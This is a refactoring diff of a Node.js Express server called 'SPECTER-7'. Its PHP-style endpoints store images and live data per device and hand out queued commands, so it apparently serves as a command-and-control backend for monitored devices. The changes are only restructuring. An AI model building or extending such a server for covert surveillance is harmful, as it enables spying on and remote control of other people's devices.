@@ -52,7 +52,6 @@ app.post('/upload.php', (req, res) => {
             }
             
             fs.writeFileSync(imagesFile, JSON.stringify(imagesData, null, 2));
-            
             updateDevicesList(deviceId);
             
             return res.json({ success: true, images_count: imagesData.length });
@@ -174,8 +173,7 @@ app.get('/live.php', (req, res) => {
         
         const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
         if (fs.existsSync(imagesFile)) {
-            const images = JSON.parse(fs.readFileSync(imagesFile, 'utf8'));
-            response.images_count = images.length;
+            response.images_count = JSON.parse(fs.readFileSync(imagesFile, 'utf8')).length;
         }
         
         res.json(response);
@@ -228,16 +226,20 @@ app.get('/api.php', (req, res) => {
             } else {
                 res.json([]);
             }
-        } 
-        else if (action === 'get_live') {
+            return;
+        }
+        
+        if (action === 'get_live') {
             const liveFile = path.join(dataDir, deviceId, 'live.json');
             if (fs.existsSync(liveFile)) {
                 res.json(JSON.parse(fs.readFileSync(liveFile, 'utf8')));
             } else {
                 res.json({});
             }
-        } 
-        else if (action === 'get_commands') {
+            return;
+        }
+        
+        if (action === 'get_commands') {
             const commandsFile = path.join(dataDir, deviceId, 'commands.json');
             if (fs.existsSync(commandsFile)) {
                 const commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
@@ -246,10 +248,10 @@ app.get('/api.php', (req, res) => {
             } else {
                 res.json({ commands: [] });
             }
-        } 
-        else {
-            res.json({ error: 'Invalid action' });
+            return;
         }
+        
+        res.json({ error: 'Invalid action' });
     } catch (e) {
         res.json({ error: e.message });
     }
@@ -320,7 +322,7 @@ function updateDevicesList(deviceId) {
     fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
 }
 
-// ============ Start ============
+// ============ Start Server ============
 app.listen(PORT, () => {
     console.log(`SPECTER-7 Server running on port ${PORT}`);
 });
